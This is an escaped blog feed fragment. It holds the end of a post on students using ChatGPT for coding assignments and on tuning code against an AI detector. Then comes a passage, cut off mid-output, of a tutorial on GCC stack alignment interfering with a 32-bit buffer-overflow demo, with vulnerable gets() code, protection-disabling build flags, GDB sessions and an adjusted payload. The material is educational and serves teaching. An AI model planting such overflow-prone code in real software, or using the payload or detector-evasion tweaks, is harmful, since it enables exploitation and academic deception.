+
+&lt;p&gt;But you also see this with undergraduate plagiarism. The latest version of undergraduate plagiarism is the content-generating features of platforms like ChatGPT, which are free and publicly available.&lt;/p&gt;
+
+&lt;p&gt;As someone who is well out of school, I wondered: Could someone &lt;em&gt;really&lt;/em&gt; use ChatGPT to cheat without gettting caught? To answer this, we can “think like an adversary,” where we try to look for the conditions that can lead a problem to manifest. Then, we can provide recommendations on how to prevent them from manifesting in the first place.&lt;/p&gt;
+
+&lt;p&gt;So, let’s assume that the assignment has a simple parameter: “generate a Worlde game.” In ChatGPT, we can do so with the following query:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Write a Python3 Worlde game&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;You are welcome to reproduce the results on your own. Here were some common patterns in each solution:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;No code comments. This included block comments for function definitions.&lt;/li&gt;
+  &lt;li&gt;No empty newlines. This interested me because Python encourages spacing for readability.&lt;/li&gt;
+  &lt;li&gt;Only one space between function calls or calsses. This is interesting because PEP8 calls for two spaces between classes or functions in a file&lt;/li&gt;
+  &lt;li&gt;Most of the solutions used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if __name__ == &quot;__main__&quot;&lt;/code&gt;. This fascinated me because a lot of junior programmers don’t use this.&lt;/li&gt;
+  &lt;li&gt;They all imported the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;random&lt;/code&gt; module and used a remarkably not-random function. We might want to encourage our developers to use functions that all system-level randomness (ex, &lt;em&gt;/dev/urandom&lt;/em&gt;) instead of simple pseudorandom functions.&lt;/li&gt;
+  &lt;li&gt;None of the solutions were object-oriented unless explicitly specified. However, ChatGPT’s solution was just a wrapper for the functions used in its non-object-oriented version.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In sum, they were all &lt;em&gt;remarkably similar&lt;/em&gt; to other solutions found online. But, let’s assume good intentions—for now.&lt;/p&gt;
+
+&lt;p&gt;Next, go to GPTZero and paste a few of the generated solutions. In every case, I got a 51% chance that the content was, in fact, generated by a GPT engine. This surprised me at first, since I had hoped for, well, a &lt;em&gt;much higher&lt;/em&gt; score from code that I had just generated for this exact purpose.&lt;/p&gt;
+
+&lt;p&gt;Granted, most of these “GPT detectors” are written with prose in mind. You are welcome to try a similar exercise with a more traditional type of paper or what have you. The point is that these results don’t hold up as well against code, where the rules are well-defined. You could probably engineer something that could detect code plagiarism, but those are not nearly as available for the everyday, underfunded professor.&lt;/p&gt;
+
+&lt;p&gt;Let’s chew on this situation for a minute. If we are generating undergraduate code, it’s probably not that complex anyway; I could imagine this worlde game as a simple, non-summative assessment. Unlike prose, code is understandably more rigid and well-defined by clear, fixed rules. You’re less likely to get the same degree of variance between “Python Worlde game” implementations as you would compared to, say, “Write a novella that feels like &lt;em&gt;Annihilation&lt;/em&gt;.” Finally, the best we can do with a free checker is get a result that is way below our expectations.&lt;/p&gt;
+
+&lt;p&gt;So, 51% is our magic number.&lt;/p&gt;
+
+&lt;h1 id=&quot;cheating-the-polygraph&quot;&gt;Cheating the Polygraph&lt;/h1&gt;
+
+&lt;p&gt;After this, I wanted to know what score it would give for some of these online solutions. I took one of the earlier code examples and ran it through GPTZero.&lt;/p&gt;
+
+&lt;p&gt;The &lt;em&gt;AI Scan&lt;/em&gt; score was a 36%, “likely to be written by a human with a few A.I. sentences.” The plagiarism score read zero.&lt;/p&gt;
+
+&lt;p&gt;I looked back at one solution generated by me, earlier, that looked very similar to this one. The differences were subtle: the A.I. code was missing comments, had no whitespace, and defined the main procedure in global namespace (unscoped).&lt;/p&gt;
+
+&lt;p&gt;With this in mind, I went back to the code in question and did the following:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Removed comments and empty newlines&lt;/li&gt;
+  &lt;li&gt;Added only one space between functions and global variables&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Run it through GPTZero. The A.I. detection score went up to 49%, “moderately likely” to be written by A.I. Interesting.&lt;/p&gt;
+
+&lt;p&gt;I made one final modification. In the code in question, there is a duplicate variable: in global namespace, and in the scope of the main application logic. Most of the GPT examples kept variables in local scopes. So, I removed the global variable. The score raised to 50%.&lt;/p&gt;
+
+&lt;p&gt;So, we’re within 1% of the target score. What does that mean?&lt;/p&gt;
+
+&lt;p&gt;In my honest view, it doesn’t mean much.&lt;/p&gt;
+
+&lt;h1 id=&quot;gotcha&quot;&gt;Gotcha?&lt;/h1&gt;
+
+&lt;p&gt;Suppose your professor takes the same methodology for each and every student in their classes (which they almost certainly do not). Would this be grounds for an Academic Integrity community to take action against a student? Would these numbers be sufficient to identify a student as cheating via ChatGPT?&lt;/p&gt;
+
+&lt;p&gt;Honestly, it doesn’t matter to me. In fact, whole dialogue emphasizes a few root problems that run much deeper than using LLM’s to pass your undergraduate degree.&lt;/p&gt;
+
+&lt;p&gt;First, undergraduate code is notoriously simple from the outset. If A.I. can generate better code solutions than your students, and that code can even evade plagiarism checkers with minor tweaks, it might be time to update your curriculum. In fact, there’s a growing trend in job application pages where the application page will explicitly state that “academic code” is &lt;em&gt;not&lt;/em&gt; an acceptable criteria for employment; we might wonder if this is largely driven by recent trends of students using A.I. to generate simple solutions for simple problems.&lt;/p&gt;
+
+&lt;p&gt;Next, the GPTZero tool wasn’t even reliable for code that I had &lt;em&gt;just&lt;/em&gt; generated from ChatGPT. A 51% success rate is abysmal. However, it may prove challenging (financially or otherwise) for a university to get their hands on a robust tool that can detect if an LLM is used to generate student code solutions. How can we really hold anyone accountable if the tools we’re using for accountability are intrinsically unreliable? This fact alone is enough to warrant some concern and, frankly, to garner some empathy.&lt;/p&gt;
+
+&lt;p&gt;Another major concern here is how academia may react to this. If educators choose to ignore the problem, students will almost certainly continue to generate their code, making just enough changes to evade detection. On the other hand, if the detection mechanisms remain close to useless, educators are powerless to really know if a student has cheated.&lt;/p&gt;
+
+&lt;p&gt;Regardless, it’s a lose-lose for students. The only “gotcha” is that someone has just paid for a degree and learned close to nothing new from it. Computer Engineering or Information Technology curricula should never find itself lovably behind the times.&lt;/p&gt;
+
+&lt;h1 id=&quot;ideas-for-ai-in-the-classroom&quot;&gt;Ideas for A.I. in the classroom&lt;/h1&gt;
+
+&lt;p&gt;Not long ago, postsecondary courses used to shun cellphones. Educators would often tell you to shut it off or leave it in your car. Now, the cellphone is integral to learning opportunities or is a primary means of communication with your professor and other supporters at the institution.&lt;/p&gt;
+
+&lt;p&gt;In the same way, A.I. can be included in the classroom to enhance a student’s understanding of code solutions. Here are some meaningful ideas that educators could begin to explore:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;AI Code Reviews&lt;/strong&gt;. Give everyone in the class a prompt for ChatGPT. Tell them to skim the code and identify any problems they observed. Since each student will generate a somewhat unique solution, their answers should have enough variance to prove that they were, at least, working with unique code. Code reviews can encourage students to identify code-quality or security with the AI code.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;AiOps&lt;/strong&gt;. AI is becoming widely used with DevOps and DevSecOps processes. For example, Github Advanced Security includes AI with their CodeQL and GitHub Copilot tools. The student could explore ways to include AI for better automation. In fact, this could be accomplished in a purely theoretical context, without the need to implement anything concrete; put another way, you should expect that your students will have opportunities to implement AI given the kinds of job openings that currently exist. Examples of an appropriate use case may include an architecture diagram for CI/CD pipelines, or a workflow diagram for where AI can be used in an existing DevOps or DevSecOps process.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Exploit Development with AI&lt;/strong&gt;. Ask students to use ChatGPT to create an exploit for a problem. (The “problem” could be based on something as simple as a CWE or something more complex like an entire CVE.) Have them test their solution and document their findings: did the exploit work, why did it fail, and so forth. Allow them to identify the key components in the generated solution that may have had more merit than others. Finally, have them revise the generated solution so that it can, in fact, deliver a payload or exploit a vulnerability/weakness as intended. This can overlap with a variety of cases, including network security, application security, and binary exploitation.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;AI Threat Detection&lt;/strong&gt;. Have students research current trends in AI Threat Detection. Use ChatGPT to try and replicate the results; document every failure or shortcoming with using that approach. Then, have them propose a LLM (or an existing LLM) that can overcome the problems. The student should use current research to support their decisions. This task could also address the problem of “deepfake” accounts on platforms suchas LinkedIn.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;AI/LLM exploitation&lt;/strong&gt;. Use well-known anecodotes about people who could “trick A.I.” into leaking information. Have a student try to repdouce those results: why do they think it failed or succeeded, etc. Further, have the student propose ideas for AI exploitation. Content can be supported with current research, which is growing by the day.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Interview your students&lt;/strong&gt;. For group projects, take a week where the students present their idea to your and your TA’s directly. Ask them strategic, deliberate questions about their ideas or design choices. This should very much resemble a real-life job interview, where the interviewer may ask the candidate to prove that they really have mastery over a topic. Job interviews are usually where students who cheated their way through university get identified and filtered out—often, very quickly.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The big takeaway for all these solutions is that they require students to prove that they understand how the LLM is working. In addition, many of these will lead to unique starting points for the assignment. However, unlike a simple code solution, the student is required to provide a novel soltuion.&lt;/p&gt;
+
+&lt;p&gt;Any of these topics could be at least attempted with AI. But those results are generally of an unaccepable quality. Of course, if you find that something like ChatGPT is able to defeat your questions, then it’s time to take your assignment back to the drawing board. In fact, that should be the baseline for whether you created an appropriately challenging question in the first place.&lt;/p&gt;
+
+&lt;p&gt;However, these LLMs are still just machines that are defined by rules, which can always be defeated given enough effort (or, in many cases, with a bare-minimum effort). Deliverables like architecture diagrams or in-depth questioning may prove less feasible to generate. Conversely, they may also stand a higher chance of being detected by a traditional plagiarism detector.&lt;/p&gt;
+
+&lt;p&gt;Industry leaders are often okay with A.I. tools used, so long as they are used &lt;em&gt;strategically&lt;/em&gt;. The strategic use of these platforms entails an understanding of &lt;em&gt;when&lt;/em&gt; and &lt;em&gt;why&lt;/em&gt; to use it. This will put your students at a much better vantage point when they are applying for a wide range of jobs.&lt;/p&gt;
+
+&lt;h1 id=&quot;mindset-shifting&quot;&gt;Mindset-shifting&lt;/h1&gt;
+
+&lt;p&gt;If you’re fixed on all of this as a punitive measure, then you might be missing the point. The goal here is to provide your students with a meaningful experience and a rich education. College is an investment, of time and money, and students deserve to get the most out of their investments. Holding your students to high standards is only meaningful if you also provide high support for them to reach those standards and to foster their goals.&lt;/p&gt;
+
+&lt;p&gt;In my view, the best antidote to the AI problem is a question of mindset: did you, as the educator, challenge yourself to generate challenges that cannot be answered by widely-available freeware? And further, did you do due dilligence to hold your students accountable for their own success?&lt;/p&gt;
+
+&lt;p&gt;This is where you, as the instructional lead, will need to also hold yourself to the same higher standard which you expect from your students. This may require you ditching the same assignments you’ve given for the past ten years. It may also require you to lean on your instructional aides in a collaborative manner, becoming more of a manager and enabling your team to provide modern, high-fidelity assignments.&lt;/p&gt;
+
+&lt;p&gt;You can take this a step further by mirroring the same leadership and collaborative structues in the classroom. Have students circulate the “leader” for a given task or initiative. This will give students an opportunity to take ownership of the quality of their work and to call-out any A.I. work that is carelessly used. Many of your students will develop into lead engineers or managers, where they will be accountable for their subordinates’ success; and you can bet that the strategic use of A.I. platforms will be something they will need to speak to eventually.&lt;/p&gt;
+
+&lt;p&gt;Academic institutions should accept that A.I. is here for the foreseeable future; now, more than ever, professors and teaching assistants need true support (not lip-service or empty regulations and policy changes). The best support is likely to be financial, investing in tools that can better detect LLM and AI generated code or text. Institutions can also provide support by recognizing professors who are taking strides in the direction of appropriate changes.&lt;/p&gt;
+
+&lt;h1 id=&quot;final-thoughts&quot;&gt;Final thoughts&lt;/h1&gt;
+
+&lt;p&gt;During my undergraduate experience, the best professors in my program were ones who understood that students may cheat. There is a difference between getting and earning a degree. So, this whole conversation is not some new phenomenon to academia; rather, A.I. is just a new version of it, and one that I don’t find particularly remarkable at all.&lt;/p&gt;
+
+&lt;p&gt;Likewise, those same professors were usually the ones who offered challenging assignments and high levels of support, whether it be career advice, networking opportunities, or considerations for my personal or professional goals. They tried to adopt new developments in computer science, information technology, or any of the disciplines which are often groped together as “Cybersecurity.” At the end of the day, these are the things that foster success.&lt;/p&gt;
+
+&lt;p&gt;Many undergraduates are fresh out of high school and still learning what it means to be a professional. If you are concerned about A.I. generated content overwhelming your curriculum, try to switch your point of view.&lt;/p&gt;
+
+&lt;p&gt;You, as the leader, have an opportunity to mentor a semester’s worth of upcoming professionals. And not just the ones who lead clubs and pay lip-service, or those who think they’ve manipulated the system because they asked an LLM to do their homework; but, really, also the ones who want to do the right thing, the ones who want to be prepared for the ever-changing workforce which they are about to inherit. The ones who work 40 hours around school so they can get their education and also eat every night.&lt;/p&gt;
+
+&lt;p&gt;Or the ones who generate A.I. content because they feel no one cares enough to check in the first place.&lt;/p&gt;</content><author><name></name></author><summary type="html">A.I. presents a new spin to the classic problem of cheating in higher-level education. To counter these challenges, I offer some ideas on how to develop assignments with the caveats presented by these content-generating platforms. As a whole, this should all promote a shift in the fidelity of assignments as well as the role of the instructional leadership teams for any course.</summary></entry><entry><title type="html">Troubleshooting buffer overflows in your vulnerable 32-bit binary</title><link href="http://localhost:4000/2023/09/19/buffer-overflow-stack-alignment.html" rel="alternate" type="text/html" title="Troubleshooting buffer overflows in your vulnerable 32-bit binary" /><published>2023-09-19T00:00:00-04:00</published><updated>2023-09-19T00:00:00-04:00</updated><id>http://localhost:4000/2023/09/19/buffer-overflow-stack-alignment</id><content type="html" xml:base="http://localhost:4000/2023/09/19/buffer-overflow-stack-alignment.html">&lt;p&gt;This writeup will cover GCC’s stack alignment features and how they can interfere with testing a simple 32-bit buffer overflow. GCC implement’s stack alignment by using two LEA instructions, the second of which will change the value of your payload.&lt;/p&gt;
+
+&lt;p&gt;As a workaround, you can either manipulate a byte to account for this offset. For simple tests, you can also just disable stack alignment.&lt;/p&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+
+&lt;p&gt;This writeup was inspired after watching &lt;a href=&quot;https://www.youtube.com/watch?v=HSlhY4Uy8SA&quot;&gt;this Live Overflow video&lt;/a&gt;. It’s a great walkthrough for a basic shellcode methodology. However, the prebuilt binary doesn’t have GCC stack alignment enabled, as evident in the disassembly at 1:40.&lt;/p&gt;
+
+&lt;p&gt;If you take the same C code at the 0:30 mark, and build it yourself in Debian, you won’t get the same results as-is. You’ll have to modify the payload or the build. We will use that code verbatim in this walkthrough and illustrate what changes in the assembly.&lt;/p&gt;
+
+&lt;h1 id=&quot;problem&quot;&gt;Problem&lt;/h1&gt;
+
+&lt;p&gt;Suppose you want to exploit a simple buffer overflow. Let’s start with some vulnerable code:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Save it in a file called &lt;em&gt;bof.c&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;The &lt;em&gt;gets&lt;/em&gt; function is well-known and insecure. In fact, the compiler will yell at you just for trying to use it.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc bof.c -o bof.out                                  
+bof.c: In function ‘main’:
+bof.c:5:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
+    5 |   gets(buf);
+      |   ^~~~
+      |   fgets
+/usr/bin/ld: /tmp/ccj0LXg4.o: in function `main&apos;:
+bof.c:(.text+0x15): warning: the `gets&apos; function is dangerous and should not be used.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Its use here is simple: to overwrite the buffer, a behavior you should &lt;em&gt;never&lt;/em&gt; allow outside of an intentionally vulnerable proof-of-concept.&lt;/p&gt;
+
+&lt;p&gt;On x86_64 and ARM64, you can build and test the code pretty simply:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc bof.c -o bof.out -fno-stack-protector
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ignore the yelling about &lt;em&gt;gets&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;We want to relax any stack protections in order to pull off the overflow. (Note: I’ve had mixed results with whether the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-fno-stack-protector&lt;/code&gt; option will inhibit an overflow. I’m keeping it because it’s a well-known practice to enable it for this kind of exercise.)&lt;/p&gt;
+
+&lt;p&gt;For the payload, we can keep it simple.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AAAABBBBCCCCDDDDEEEEFFFF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;On a 64-bit system, we expect that eight of these letters, in pairs of four bytes, will appear in the stack.&lt;/p&gt;
+
+&lt;p&gt;In GDB, you can run the attack:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb bof.out                              
+GNU gdb (Debian 13.2-1) 13.2
+...
+(gdb) r
+Starting program: /home/kali/bof.out 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+AAAABBBBCCCCDDDDEEEEFFFF
+
+Program received signal SIGSEGV, Segmentation fault.
+0x4545454544444444 in ?? ()
+(gdb) i r rip
+rip            0x4545454544444444  0x4545454544444444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Based on the output, the application tried to execute &lt;em&gt;0x4545454544444444&lt;/em&gt;. This is the little-endian representation of &lt;em&gt;DDDDEEEE&lt;/em&gt;, a section from our simple payload. So, the overflow attack was successful.&lt;/p&gt;
+
+&lt;p&gt;However, let’s try the same thing for a 32-bit build.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc bof.c -o bof.out -m32 -march=i386 -fno-stack-protector
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;(Note: You may need to install other dependencies to cross-compile. On Debian systems, you can install the  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc-multilib&lt;/code&gt; package.)&lt;/p&gt;
+
+&lt;p&gt;Open it in GDB and run the same commands.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb bof.out 
+GNU gdb (Debian 13.2-1) 13.2
+...
+(gdb) r
+Starting program: /home/kali/bof.out 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+AAAABBBBCCCCDDDDEEEEFFFF
+
+Program received signal SIGSEGV, Segmentation fault.
+0x565561c8 in main ()
+(gdb) i r eip
+eip            0x565561c8          0x565561c8 &amp;lt;main+59&amp;gt;
+(gdb) i r esp
+esp            0x4242423e          0x4242423e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The application tried to access &lt;em&gt;0x4242423e&lt;/em&gt;. Notice that this almost matches the &lt;em&gt;BBBB&lt;/em&gt; input from our payload. However, one byte is off. Why?&lt;/p&gt;
+
+&lt;p&gt;At this point, you could try different payloads, and you’ll notice the off-by-negative-four each time. This is part of how GCC implements stack alignment. The reason why this happens is evident in the disassembly.&lt;/p&gt;
+
+&lt;h1 id=&quot;gcc-stack-alignment&quot;&gt;GCC Stack Alignment&lt;/h1&gt;
+
+&lt;p&gt;Disassemble the application logic:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) disassemble main
+Dump of assembler code for function main:
+   0x5655618d &amp;lt;+0&amp;gt;:	lea    ecx,[esp+0x4]
+   0x56556191 &amp;lt;+4&amp;gt;:	and    esp,0xfffffff0
+   0x56556194 &amp;lt;+7&amp;gt;:	push   DWORD PTR [ecx-0x4]
+   0x56556197 &amp;lt;+10&amp;gt;:	push   ebp
+   0x56556198 &amp;lt;+11&amp;gt;:	mov    ebp,esp
+   0x5655619a &amp;lt;+13&amp;gt;:	push   ebx
+   0x5655619b &amp;lt;+14&amp;gt;:	push   ecx
+   0x5655619c &amp;lt;+15&amp;gt;:	sub    esp,0x10
+   0x5655619f &amp;lt;+18&amp;gt;:	call   0x565561c9 &amp;lt;__x86.get_pc_thunk.ax&amp;gt;
+   0x565561a4 &amp;lt;+23&amp;gt;:	add    eax,0x2e50
+   0x565561a9 &amp;lt;+28&amp;gt;:	sub    esp,0xc
+   0x565561ac &amp;lt;+31&amp;gt;:	lea    edx,[ebp-0xc]
+   0x565561af &amp;lt;+34&amp;gt;:	push   edx
+   0x565561b0 &amp;lt;+35&amp;gt;:	mov    ebx,eax
+   0x565561b2 &amp;lt;+37&amp;gt;:	call   0x56556040 &amp;lt;gets@plt&amp;gt;
+   0x565561b7 &amp;lt;+42&amp;gt;:	add    esp,0x10
+   0x565561ba &amp;lt;+45&amp;gt;:	mov    eax,0x0
+   0x565561bf &amp;lt;+50&amp;gt;:	lea    esp,[ebp-0x8]
+   0x565561c2 &amp;lt;+53&amp;gt;:	pop    ecx
+   0x565561c3 &amp;lt;+54&amp;gt;:	pop    ebx
+   0x565561c4 &amp;lt;+55&amp;gt;:	pop    ebp
+   0x565561c5 &amp;lt;+56&amp;gt;:	lea    esp,[ecx-0x4]
+   0x565561c8 &amp;lt;+59&amp;gt;:	ret
+End of assembler dump.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observe the LEA instruction at &lt;em&gt;0x565561c5&lt;/em&gt; (&lt;em&gt;main&lt;/em&gt;+56):&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lea    esp,[ecx-0x4]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In short, this instruction is saying that the value in &lt;em&gt;ECX&lt;/em&gt; will be subtracted by 4, then set as the address of &lt;em&gt;ESP&lt;/em&gt;. Let’s rerun and see what’s in &lt;em&gt;ECX&lt;/em&gt; before and after that instruction:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) b *(main+56)
+Breakpoint 1 at 0x565561c5
+(gdb) r
+...
+Breakpoint 1, 0x565561c5 in main ()
+=&amp;gt; 0x565561c5 &amp;lt;main+56&amp;gt;:	lea    esp,[ecx-0x4]
+(gdb) i r esp
+esp            0xffffd48c          0xffffd48c
+(gdb) i r ecx
+ecx            0x42424242          1111638594
+(gdb) ni
+0x565561c8 in main ()
+(gdb) x/1i $pc
+=&amp;gt; 0x565561c8 &amp;lt;main+59&amp;gt;:	ret
+(gdb) i r esp
+esp            0x4242423e          0x4242423e
+(gdb) i r ecx
+ecx            0x42424242          1111638594
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At &lt;em&gt;main&lt;/em&gt;+56, if you try to access any memory at &lt;em&gt;ECX&lt;/em&gt; or &lt;em&gt;ECX - 0x04&lt;/em&gt;, you’ll get an error:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/8wx $ecx
+0x42424242:     Cannot access memory at address 0x42424242
+(gdb) x/8wx $ecx-0x4
+0x4242423e:     Cannot access memory at address 0x4242423e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, &lt;em&gt;ESP&lt;/em&gt; is set to &lt;em&gt;0x42424242 - 0x4&lt;/em&gt;, or &lt;em&gt;0x4242423e&lt;/em&gt;. All because of that LEA instruction. Go back a bit in the disassembly and observe a similar instruction at the beginning of &lt;em&gt;main&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x5655618d &amp;lt;+0&amp;gt;:	lea    ecx,[esp+0x4]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;What are the LEA instructions doing?&lt;/p&gt;
+
+&lt;p&gt;This is actually a compiler optimization: enforcing a 16-byte stack boundary. There are valid, beneficial reasons why GCC adds this. You can read more about this elsewhere, but the gist is that, if GCC fails to account for this, an application may experience undefined behavior.&lt;/p&gt;
+
+&lt;p&gt;Notice that, in the 64-bit build, these instructions do not appear at all. Rebuild the 64-bit version as we did earlier, then view the disassembly:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) disas main
+Dump of assembler code for function main:
+   0x0000000000001139 &amp;lt;+0&amp;gt;:   push   rbp
+   0x000000000000113a &amp;lt;+1&amp;gt;:   mov    rbp,rsp
+   0x000000000000113d &amp;lt;+4&amp;gt;:   sub    rsp,0x10
+   0x0000000000001141 &amp;lt;+8&amp;gt;:   lea    rax,[rbp-0x4]
+   0x0000000000001145 &amp;lt;+12&amp;gt;:  mov    rdi,rax
+   0x0000000000001148 &amp;lt;+15&amp;gt;:  mov    eax,0x0
+   0x000000000000114d &amp;lt;+20&amp;gt;:  call   0x1030 &amp;lt;gets@plt&amp;gt;
+   0x0000000000001152 &amp;lt;+25&amp;gt;:  mov    eax,0x0
+   0x0000000000001157 &amp;lt;+30&amp;gt;:  leave
+   0x0000000000001158 &amp;lt;+31&amp;gt;:  ret
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, for the purpose of testing a 32-bit binary, it also means that one byte of our overflow will be off by 4. This makes it harder to test well-documented vulnerable C examples and walkthroughs that target 32-bit systems. Further, if something like a CTF builds a 32-bit binary with this feature, it also means that you may need to compensate in your payload.&lt;/p&gt;
+
+&lt;p&gt;Here are two fairly simple workarounds. They have not been &lt;em&gt;rigorously&lt;/em&gt; tested, but they should do the job if you’re in a pinch.&lt;/p&gt;
+
+&lt;h1 id=&quot;workaround-1-basic-addition&quot;&gt;Workaround 1: Basic Addition&lt;/h1&gt;
+
+&lt;p&gt;With all other factors aside, a really simple compensating technique is just to add 4 to the value of whatever payload you intend to send, for the “last” (Little Endian) byte. So, if we wanted to overflow ESP wih &lt;em&gt;AAAA&lt;/em&gt;, we could send:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BBBBEAAA
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The first four bytes are just padding. The next four bytes will overflow and resolve to &lt;em&gt;AAAA&lt;/em&gt;. Since &lt;em&gt;E = 0x45&lt;/em&gt;, this will become to &lt;em&gt;0x41 = A&lt;/em&gt; after the final LEA instruction in &lt;em&gt;main&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Check it in the debugger:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) disas main
+Dump of assembler code for function main:
+   ...
